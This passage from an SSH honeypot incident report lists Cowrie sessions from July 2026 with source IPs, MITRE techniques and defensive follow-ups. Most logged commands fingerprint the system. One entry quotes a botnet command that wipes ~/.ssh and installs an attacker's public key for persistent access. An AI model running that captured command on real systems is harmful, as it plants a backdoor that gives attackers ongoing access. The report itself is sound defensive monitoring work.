| `2026-07-23 17:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.28.109[.]188` to AbuseIPDB if not already reported
- [ ] Block `120.28.109[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53de23e552fe

| Field | Detail |
|---|---|
| **Source IP** | `103.56.115[.]187` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:44` | `cowrie.session.connect` |
| `2026-07-23 17:25:44` | `cowrie.client.version` |
| `2026-07-23 17:25:44` | `cowrie.client.kex` |
| `2026-07-23 17:25:45` | `cowrie.login.success` |
| `2026-07-23 17:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.56.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef8b71eafc9

| Field | Detail |
|---|---|
| **Source IP** | `103.56.115[.]187` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:45` | `cowrie.session.connect` |
| `2026-07-23 17:25:45` | `cowrie.client.version` |
| `2026-07-23 17:25:45` | `cowrie.client.kex` |
| `2026-07-23 17:25:46` | `cowrie.login.success` |
| `2026-07-23 17:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.56.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7ad114475b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:27 |
| **Last Seen** | 2026-07-23 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:27:05` | `cowrie.session.connect` |
| `2026-07-23 17:27:05` | `cowrie.client.version` |
| `2026-07-23 17:27:05` | `cowrie.client.kex` |
| `2026-07-23 17:27:05` | `cowrie.login.success` |
| `2026-07-23 17:27:06` | `cowrie.session.params` |
| `2026-07-23 17:27:06` | `cowrie.command.input` |
| `2026-07-23 17:27:06` | `cowrie.log.closed` |
| `2026-07-23 17:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36dcddb64460

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:28 |
| **Last Seen** | 2026-07-23 17:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:28:13` | `cowrie.session.connect` |
| `2026-07-23 17:28:13` | `cowrie.client.version` |
| `2026-07-23 17:28:13` | `cowrie.client.kex` |
| `2026-07-23 17:28:14` | `cowrie.login.success` |
| `2026-07-23 17:28:16` | `cowrie.session.params` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.success` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.command.input` |
| `2026-07-23 17:28:16` | `cowrie.log.closed` |
| `2026-07-23 17:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91bfe15bd3e6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:28 |
| **Last Seen** | 2026-07-23 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:28:39` | `cowrie.session.connect` |
| `2026-07-23 17:28:39` | `cowrie.client.version` |
| `2026-07-23 17:28:39` | `cowrie.client.kex` |
| `2026-07-23 17:28:39` | `cowrie.login.success` |
| `2026-07-23 17:28:40` | `cowrie.session.params` |
| `2026-07-23 17:28:40` | `cowrie.command.input` |
| `2026-07-23 17:28:40` | `cowrie.log.closed` |
| `2026-07-23 17:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abf7797576b3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:30 |
| **Last Seen** | 2026-07-23 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:30:20` | `cowrie.session.connect` |
| `2026-07-23 17:30:20` | `cowrie.client.version` |
| `2026-07-23 17:30:20` | `cowrie.client.kex` |
| `2026-07-23 17:30:20` | `cowrie.login.success` |
| `2026-07-23 17:30:21` | `cowrie.session.params` |
| `2026-07-23 17:30:21` | `cowrie.command.input` |
| `2026-07-23 17:30:21` | `cowrie.log.closed` |
| `2026-07-23 17:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-713acc355a0d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:30 |
| **Last Seen** | 2026-07-23 17:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:30:52` | `cowrie.session.connect` |
| `2026-07-23 17:30:53` | `cowrie.client.version` |
| `2026-07-23 17:30:53` | `cowrie.client.kex` |
| `2026-07-23 17:30:55` | `cowrie.login.success` |
| `2026-07-23 17:30:57` | `cowrie.session.params` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.success` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.command.input` |
| `2026-07-23 17:30:57` | `cowrie.log.closed` |
| `2026-07-23 17:30:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e97888d14bd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:32 |
| **Last Seen** | 2026-07-23 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:32:04` | `cowrie.session.connect` |
| `2026-07-23 17:32:04` | `cowrie.client.version` |
| `2026-07-23 17:32:04` | `cowrie.client.kex` |
| `2026-07-23 17:32:05` | `cowrie.login.success` |
| `2026-07-23 17:32:05` | `cowrie.session.params` |
| `2026-07-23 17:32:05` | `cowrie.command.input` |
| `2026-07-23 17:32:06` | `cowrie.log.closed` |
| `2026-07-23 17:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f438cd0399c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-23 17:32 |
| **Last Seen** | 2026-07-23 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:32:24` | `cowrie.session.connect` |
| `2026-07-23 17:32:24` | `cowrie.client.version` |
| `2026-07-23 17:32:24` | `cowrie.client.kex` |
| `2026-07-23 17:32:25` | `cowrie.login.success` |
| `2026-07-23 17:32:25` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:32:25` | `cowrie.direct-tcpip.data` |
| `2026-07-23 17:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-351145d3d3b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:33 |
| **Last Seen** | 2026-07-23 17:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:33:30` | `cowrie.session.connect` |
| `2026-07-23 17:33:31` | `cowrie.client.version` |
| `2026-07-23 17:33:31` | `cowrie.client.kex` |
| `2026-07-23 17:33:33` | `cowrie.login.success` |
| `2026-07-23 17:33:34` | `cowrie.session.params` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.success` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:34` | `cowrie.command.input` |
| `2026-07-23 17:33:35` | `cowrie.log.closed` |
| `2026-07-23 17:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6abb568f3a2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:33 |
| **Last Seen** | 2026-07-23 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:33:45` | `cowrie.session.connect` |
| `2026-07-23 17:33:45` | `cowrie.client.version` |
| `2026-07-23 17:33:45` | `cowrie.client.kex` |
| `2026-07-23 17:33:46` | `cowrie.login.success` |
| `2026-07-23 17:33:46` | `cowrie.session.params` |
| `2026-07-23 17:33:46` | `cowrie.command.input` |
| `2026-07-23 17:33:46` | `cowrie.log.closed` |
| `2026-07-23 17:33:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c777a93b524e

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-07-23 17:35 |
| **Last Seen** | 2026-07-23 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:35:07` | `cowrie.session.connect` |
| `2026-07-23 17:35:08` | `cowrie.client.version` |
| `2026-07-23 17:35:08` | `cowrie.client.kex` |
| `2026-07-23 17:35:09` | `cowrie.login.success` |
| `2026-07-23 17:35:10` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efab60d65346

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:35 |
| **Last Seen** | 2026-07-23 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:35:19` | `cowrie.session.connect` |
| `2026-07-23 17:35:19` | `cowrie.client.version` |
| `2026-07-23 17:35:19` | `cowrie.client.kex` |
| `2026-07-23 17:35:19` | `cowrie.login.success` |
| `2026-07-23 17:35:20` | `cowrie.session.params` |
| `2026-07-23 17:35:20` | `cowrie.command.input` |
| `2026-07-23 17:35:20` | `cowrie.log.closed` |
| `2026-07-23 17:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ec058cc4503

| Field | Detail |
|---|---|
| **Source IP** | `102.110.7[.]160` |
| **First Seen** | 2026-07-23 17:35 |
| **Last Seen** | 2026-07-23 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:35:19` | `cowrie.session.connect` |
| `2026-07-23 17:35:20` | `cowrie.client.version` |
| `2026-07-23 17:35:20` | `cowrie.client.kex` |
| `2026-07-23 17:35:21` | `cowrie.login.success` |
| `2026-07-23 17:35:22` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.110.7[.]160` to AbuseIPDB if not already reported
- [ ] Block `102.110.7[.]160` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f369a38a091e

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-07-23 17:36 |
| **Last Seen** | 2026-07-23 17:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:36:06` | `cowrie.session.connect` |
| `2026-07-23 17:36:07` | `cowrie.client.version` |
| `2026-07-23 17:36:07` | `cowrie.client.kex` |
| `2026-07-23 17:36:08` | `cowrie.login.success` |
| `2026-07-23 17:36:08` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b173c86086e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:36 |
| **Last Seen** | 2026-07-23 17:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:36:07` | `cowrie.session.connect` |
| `2026-07-23 17:36:08` | `cowrie.client.version` |
| `2026-07-23 17:36:08` | `cowrie.client.kex` |
| `2026-07-23 17:36:09` | `cowrie.login.success` |
| `2026-07-23 17:36:11` | `cowrie.session.params` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.success` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.command.input` |
| `2026-07-23 17:36:11` | `cowrie.log.closed` |
| `2026-07-23 17:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-303d12f0c2bb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:36 |
| **Last Seen** | 2026-07-23 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:36:55` | `cowrie.session.connect` |
| `2026-07-23 17:36:55` | `cowrie.client.version` |
| `2026-07-23 17:36:55` | `cowrie.client.kex` |
| `2026-07-23 17:36:56` | `cowrie.login.success` |
| `2026-07-23 17:36:56` | `cowrie.session.params` |
| `2026-07-23 17:36:56` | `cowrie.command.input` |
| `2026-07-23 17:36:56` | `cowrie.log.closed` |
| `2026-07-23 17:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dad93e17934

| Field | Detail |
|---|---|
| **Source IP** | `157.20.37[.]254` |
| **First Seen** | 2026-07-23 17:37 |
| **Last Seen** | 2026-07-23 17:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:37:18` | `cowrie.session.connect` |
| `2026-07-23 17:37:18` | `cowrie.client.version` |
| `2026-07-23 17:37:18` | `cowrie.client.kex` |
| `2026-07-23 17:37:19` | `cowrie.login.success` |
| `2026-07-23 17:37:20` | `cowrie.session.params` |
| `2026-07-23 17:37:20` | `cowrie.command.input` |
| `2026-07-23 17:37:20` | `cowrie.command.failed` |
| `2026-07-23 17:37:21` | `cowrie.log.closed` |
| `2026-07-23 17:37:22` | `cowrie.session.params` |
| `2026-07-23 17:37:22` | `cowrie.command.input` |
| `2026-07-23 17:37:22` | `cowrie.session.file_download` |
| `2026-07-23 17:37:22` | `cowrie.log.closed` |
| `2026-07-23 17:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.37[.]254` to AbuseIPDB if not already reported
- [ ] Block `157.20.37[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8267bc45d6

| Field | Detail |
|---|---|
| **Source IP** | `157.20.37[.]254` |
| **First Seen** | 2026-07-23 17:37 |
| **Last Seen** | 2026-07-23 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:37:22` | `cowrie.session.connect` |
| `2026-07-23 17:37:22` | `cowrie.client.version` |
| `2026-07-23 17:37:23` | `cowrie.client.kex` |
| `2026-07-23 17:37:24` | `cowrie.login.success` |
| `2026-07-23 17:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.37[.]254` to AbuseIPDB if not already reported
- [ ] Block `157.20.37[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95932081c04

| Field | Detail |
|---|---|
| **Source IP** | `157.20.37[.]254` |
| **First Seen** | 2026-07-23 17:37 |
| **Last Seen** | 2026-07-23 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:37:24` | `cowrie.session.connect` |
| `2026-07-23 17:37:24` | `cowrie.client.version` |
| `2026-07-23 17:37:24` | `cowrie.client.kex` |
| `2026-07-23 17:37:25` | `cowrie.login.success` |
| `2026-07-23 17:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.37[.]254` to AbuseIPDB if not already reported
- [ ] Block `157.20.37[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a225138b6cea

| Field | Detail |
|---|---|
| **Source IP** | `36.74.222[.]124` |
| **First Seen** | 2026-07-23 17:37 |
| **Last Seen** | 2026-07-23 17:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:37:43` | `cowrie.session.connect` |
